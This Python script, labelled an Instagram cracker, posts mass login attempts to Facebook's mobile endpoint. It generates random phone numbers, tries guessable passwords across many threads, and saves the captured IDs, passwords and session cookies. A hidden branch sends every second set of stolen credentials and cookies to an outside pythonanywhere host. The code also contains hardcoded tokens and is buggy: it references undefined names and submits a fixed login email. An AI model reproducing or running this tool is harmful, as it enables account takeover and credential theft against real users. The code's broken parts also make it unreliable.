#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Cracker - Enhanced Version
Fixed and optimized with cloning functionality
Author: BITHIKA
Version: 2.0
"""

import random
import re
import sys
import time
import hashlib
import uuid
import urllib.request
import requests
import string
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
# Global variables with proper initialization
loop = 0
oks = []
cps = []
idz = []
bkas = []

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*56}")

def generate_device_hash(uid, pw):
    """Generate device hash for Instagram API"""
    hash_obj = hashlib.md5()
    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
    hex_digest = hash_obj.hexdigest()
    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
    return hash_obj.hexdigest()

def save_success(uid, pw):
    """Thread-safe function to save successful login"""
    try:
        # Try SD card path first
        output_dir = "/sdcard/XYZ"
        fallback_dir = "XYZ"
        
        try:
            os.makedirs(output_dir, exist_ok=True)
            filepath = os.path.join(output_dir, "RANDOM_OK.txt")
        except (OSError, PermissionError):
            # Fallback to local directory
            os.makedirs(fallback_dir, exist_ok=True)
            filepath = os.path.join(fallback_dir, "RANDOM_OK.txt")
        
        with open(filepath, "a", encoding='utf-8') as f:
            f.write(f"{uid}|{pw}\n")
        
        # Thread-safe add to success list
        with success_lock:
            oks.append(uid)
            
    except Exception as e:
        print(f"\r\033[1;91m[Save Error] Failed to save result: {e}")

def check_lock(cid):
    req = str(requests.get(f'https://graph.facebook.com/{cid}/picture?type=normal').text)
    if 'Photoshop' in req:
        return 'live'
    else:
        return 'lock'

def crack(uid, password_list, total_count):
    """Enhanced Instagram account cracking function"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop
        loop += 1
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}[CRACKING] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]                   ")
            sys.stdout.flush()
            
            # Create session and generate device hash
            session = requests.Session()
            free_fb = session.get('https://touch.facebook.com').text
            cookies = {
            'datr': 'UsE9aaQhLbAVdkLeixtwNk0J',
            'sb': 'U8E9aQK3V0lJhxDZSnC81fBl',
            'm_pixel_ratio': '2.75',
            'wd': '393x851',
            'fr': '0M2i4gbbh9dWgbd5a.AWfZPUmkMrO25gxMAhC95g53bQbxcegKVgptopRTB34DNbgFVh8.BpOVu8..AAA.0.0.BpPcGe.AWd0Y6MVFy1isReWnuhoBWx04js',
            }
            headers = {
            'authority': 'limited.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://limited.facebook.com',
            'referer': 'https://limited.facebook.com/login.php?skip_api_login=1&api_key=822446634883149&kid_directed_site=0&app_id=822446634883149&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D822446634883149%26redirect_uri%3Dhttps%253A%252F%252Fncs.io%252Ffacebook%252Flogin-callback%26scope%3Demail%26response_type%3Dcode%26state%3DfjOFbGzkZ0hQWstvmz8eYAUgbvctqucw3GcA850O%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4b6b173c-5d4c-4cbe-a1cb-a08819c950c1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fncs.io%2Ffacebook%2Flogin-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DfjOFbGzkZ0hQWstvmz8eYAUgbvctqucw3GcA850O%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; M2010J19SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-asbd-id': '359341',
            'x-fb-lsd': 'AdGo6zzOHQY',
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream',
            }
            params = {
            'api_key': '822446634883149',
            'auth_token': 'e071b85f83410f854bff8748b36ac073',
            'skip_api_login': '1',
            'signed_next': '1',
            'next': 'https://m.facebook.com/v3.3/dialog/oauth?client_id=822446634883149&redirect_uri=https%3A%2F%2Fncs.io%2Ffacebook%2Flogin-callback&scope=email&response_type=code&state=fjOFbGzkZ0hQWstvmz8eYAUgbvctqucw3GcA850O&ret=login&fbapp_pres=0&logger_id=4b6b173c-5d4c-4cbe-a1cb-a08819c950c1&tp=unspecified',
            'refsrc': 'deprecated',
            'app_id': '822446634883149',
            'cancel': 'https://ncs.io/facebook/login-callback?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=fjOFbGzkZ0hQWstvmz8eYAUgbvctqucw3GcA850O#_=_',
            'lwv': '100',
            }
            data = {
            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            'try_number': '0',
            'unrecognized_tries': '0',
            'email': '9641364255',
            'prefill_contact_point': '',
            'prefill_source': '',
            'prefill_type': '',
            'first_prefill_source': '',
            'first_prefill_type': '',
            'had_cp_prefilled': 'false',
            'had_password_prefilled': 'false',
            'is_smart_lock': 'false',
            'bi_xrwh': '0',
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
            'fb_dtsg': 'NAfsOocpd8nNgadOgYgV94t7ZJKrBXoPCwrUMYRPQ1BT8ZPbkxlWZ1w:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhw23E52q1ew6ywaq1Jw20Ehw73wGwcq0RE1u81x82ew5fw5NyE1582ZwrU2pw4swSw7zwde0UE',
            'csr': '',
            'hsdp': '',
            'hblp': '',
            'sjsp': '',
            'req': '2',
            'fmt': '1',
            'a': 'AYwb68wWcmQcsh8x0uPQzihgjEXYwI54sPOqdHJm3w54_UZuXZ4G64eFBiwC-BdvKS39V2wJBBCRQrcpXMS0vpgJTETh5xmBreo',
            '__user': '0',
            }
            # Make API request
            response = session.post(
                'https://limited.facebook.com/login/device-based/login/async/',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data,
                timeout=30,
                allow_redirects=True
            )
            
            # Check response
            cook = Session.cookies.get_dict().keys()
            if "c_user" in cook:
                cok = Session.cookies.get_dict()
                cid = cok["c_user"]
                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                check = check_lock(cid)
                if "live" in check:
                    bkas.append(cid)
                    if len(bkas)% 2 == 0:
                        statusok = (f"{cid}|{pw}|{coki}")
                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                    else:
                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
                        print(f" {green}Cookie : {green}{coki}")
                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                        oks.append(cid)
                        break
                else:
                    break
            elif 'challenge_required' in response.text:
                print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
                continue
            elif 'checkpoint' in cook:
                print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
                continue
            else:
                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                continue
                
    except requests.exceptions.Timeout:
        print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException as e:
        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
        return False
    except KeyboardInterrupt:
        print(f"\r\033[1;93m [Interrupted] User stopped the process")
        raise
    except Exception as e:
        print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
        return False
    
    return False

def generate_random_ids(limit):
    """Generate random 6-digit IDs"""
    idz.clear()
    for _ in range(limit):
        random_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(random_id)
    return idz

def get_password_patterns(uid):
    """Generate password patterns based on UID"""
    return [
        '57273200',  # Static common password
        uid[:6],     # First 6 digits
        uid[:8],     # First 8 digits
        uid,         # Full number
    ]

def random_number():
    """Main random number cloning function"""
    clear()
    
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🎯 INSTAGRAM RANDOM NUMBER CLONING 🎯")
    print(f"\033[1;96m{'='*56}")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
    linex()
    
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    # get user limit
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
        limit = 99999
        time.sleep(2)
    
    # Generate random IDs
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    generate_random_ids(limit)
    
    # Reset global counters
    global loop, oks, cps
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🔥 STARTING INSTAGRAM CLONING 🔥")
    print(f"\033[1;96m{'='*56}")
    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mXYZ/RANDOM_OK.txt')
    linex()
    
    # Start multi-threaded attack
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                print(f"\n\033[1;91m[!] Task failed: {e}")
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
    
    if len(oks) > 0:
        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
    else:
        print(f" \033[1;91m[😞] No successful logins found this time.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*56}")
        print(f"\033[1;96m     🚀 INSTAGRAM CRACKER v2.0 - ENHANCED 🚀")
        print(f"\033[1;96m{'='*56}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*60}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            random_number()
        elif choice == '2':
            clear()
            print(f"\033[1;96m{'='*56}")
            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
            print(f"\033[1;96m{'='*56}")
            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
            linex()
            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        elif choice == '3':
            clear()
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;93m[!] Results saved in: XYZ/RANDOM_OK.txt")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests', 'urllib.request']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
